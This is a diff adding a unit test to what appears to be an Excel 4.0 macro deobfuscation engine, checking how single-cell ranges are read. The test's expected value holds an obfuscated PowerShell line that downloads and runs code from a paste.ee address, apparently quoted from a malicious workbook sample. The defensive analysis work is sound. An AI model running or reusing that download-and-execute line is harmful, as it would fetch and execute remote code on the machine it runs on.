@@ -13,6 +13,7 @@ from test import TestBase
 from test.lib.excel.samples import (
     DATES_XLSB,
     XLM_MACRO_FORMULA_XLSM,
+    XLM_MACRO_NAMES_BIFF8,
     XLM_MACRO_RPN_BIFF8,
     XLM_MACRO_TEXT_XLSM,
 )
@@ -122,6 +123,22 @@ class TestEvaluateExpression(TestBase):
             evaluate_expression(engine, parse_formula('#N/A'), cursor).text,
             '#N/A',
         )
+
+    def test_a_scalar_operator_reads_a_single_cell_range_as_its_cell(self):
+        """
+        A range that names one cell twice is the smallest rectangle a range can be, and a scalar
+        read of it takes the value of that cell; any wider range keeps the address it spells.
+        """
+        engine = XlmEngine(XlmView(XLM_MACRO_NAMES_BIFF8))
+        cursor = XlmCursor('Acf444', 9591, 1)
+        value = evaluate_expression(engine, parse_formula('"x"&A9590:A9590'), cursor)
+        self.assertEqual(
+            value.value,
+            "xIEX (new`-OB`jeCT('Net.WebClient')).'DoWnloAdsTrInG'('ht'+'tp://paste.ee/r/pLpR9')",
+        )
+        self.assertEqual(value.partial, False)
+        wider = evaluate_expression(engine, parse_formula('"x"&A9590:A9592'), cursor)
+        self.assertEqual(wider.value, 'xAcf444!A9590:Acf444!A9592')
 
     def test_an_unparsed_formula_evaluates_to_its_partial_text(self):
         engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
